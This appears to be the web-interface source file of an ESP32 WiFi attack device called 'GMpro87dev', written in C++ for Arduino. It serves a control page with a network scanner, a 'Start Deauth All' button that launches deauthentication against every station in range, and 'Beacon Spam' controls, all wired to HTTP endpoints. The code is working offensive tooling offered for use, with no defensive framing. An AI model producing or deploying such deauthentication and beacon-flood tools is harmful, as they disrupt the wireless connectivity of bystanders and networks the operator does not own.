#include <WebServer.h>
#include <DNSServer.h>
#include <WiFi.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"

extern void start_beacon();
extern void stop_beacon();
extern bool is_beacon_running();

WebServer server(80);
extern int eliminated_stations;
extern bool beacon_active;
extern int beacon_counter;

void handleRoot() {
  String html = R"===(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GMpro87dev</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#0f172a;color:#fff;padding:20px}
.header{background:#1e293b;padding:20px;border-radius:12px;margin-bottom:20px;text-align:center}
.header h1{color:#818cf8;font-size:2em}
.card{background:#1e293b;border-radius:12px;padding:20px;margin-bottom:15px}
.card h2{color:#a78bfa;margin-bottom:15px}
.btn{padding:12px 24px;border:none;border-radius:8px;cursor:pointer;margin:5px;font-weight:600}
.btn-primary{background:#6366f1;color:#fff}
.btn-danger{background:#ef4444;color:#fff}
.btn:hover{opacity:0.9}
.status{background:#64748b;padding:5px 15px;border-radius:20px;font-size:12px}
.status-on{background:#22c55e}
.info{background:#334155;padding:10px;border-radius:8px;margin-top:10px}
table{width:100%}
th,td{padding:10px;border-bottom:1px solid #334155;text-align:left}
th{color:#a78bfa}
</style>
</head>
<body>
<div class="header"><h1>GMpro87dev</h1><p>Full Features: Deauth + Beacon</p></div>

<div class="card"><h2>WiFi Scanner</h2>
<button class="btn btn-primary" onclick="scanWiFi()">Scan</button>
<div id="scanResult" class="info">Tap scan</div></div>

<div class="card"><h2>Deauth Attack</h2>
<p>Sent: <span id="deauthCount">0</span></p>
<button class="btn btn-danger" onclick="startDeauth()">Start Deauth All</button>
<button class="btn btn-primary" onclick="stopAttack()">Stop</button></div>

<div class="card"><h2>Beacon Spam</h2>
<p>Status: <span id="beaconStatus" class="status">OFF</span> | Frames: <span id="beaconCount">0</span></p>
<button class="btn btn-primary" onclick="startBeacon()">Start</button>
<button class="btn btn-danger" onclick="stopBeacon()">Stop</button></div>

<script>
function scanWiFi(){fetch('/scan').then(r=>r.json()).then(d=>{
  let t='<table><tr><th>#</th><th>SSID</th><th>Ch</th><th>RSSI</th></tr>';
  d.forEach((n,i)=>t+='<tr><td>'+i+'</td><td>'+n.ssid+'</td><td>'+n.ch+'</td><td>'+n.rssi+'</td></tr>');
  document.getElementById('scanResult').innerHTML=d.length+' networks'+t;
})}
function startDeauth(){fetch('/deauth?type=all')}
function stopAttack(){fetch('/stop')}
function startBeacon(){fetch('/beacon?cmd=start');document.getElementById('beaconStatus').className='status status-on';document.getElementById('beaconStatus').innerText='ON';setInterval(updateBeacon,1000)}
function stopBeacon(){fetch('/beacon?cmd=stop');document.getElementById('beaconStatus').className='status';document.getElementById('beaconStatus').innerText='OFF'}
function updateBeacon(){fetch('/beaconStatus').then(r=>r.json()).then(d=>document.getElementById('beaconCount').innerText=d.count)}
setInterval(()=>fetch('/status').then(r=>r.json()).then(d=>document.getElementById('deauthCount').innerText=d.deauth),2000);
</script>
</body>
</html>
===)";
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanComplete();
  if (n == -2) { WiFi.scanNetworks(true); server.send(200, "application/json", "[]"); }
  else if (n == -1) server.send(200, "application/json", "[]");
  else {
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"ch\":" + WiFi.channel(i) + ",\"rssi\":" + WiFi.RSSI(i) + "}";
    }
    json += "]";
    WiFi.scanDelete();
    WiFi.scanNetworks(true);
    server.send(200, "application/json", json);
  }
}

void handleDeauth() {
  String t = server.arg("type");
  if (t == "all") start_deauth(0, 1, 1);
  server.send(200, "text/plain", "OK");
}

void handleStop() {
  stop_deauth();
  stop_beacon();
  server.send(200, "text/plain", "OK");
}

void handleBeacon() {
  String cmd = server.arg("cmd");
  if (cmd == "start") start_beacon();
  else if (cmd == "stop") stop_beacon();
  server.send(200, "text/plain", "OK");
}

void handleBeaconStatus() {
  server.send(200, "application/json", "{\"running\":" + String(is_beacon_running() ? "true" : "false") + ",\"count\":" + beacon_counter + "}");
}

void handleStatus() {
  server.send(200, "application/json", "{\"deauth\":" + eliminated_stations + "}");
}

void start_web_interface() {
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth);
  server.on("/stop", handleStop);
  server.on("/beacon", handleBeacon);
  server.on("/beaconStatus", handleBeaconStatus);
  server.on("/status", handleStatus);
  server.begin();
  DEBUG_PRINTLN("Web Server Started");
}

void web_interface_handle_client() {
  server.handleClient();
}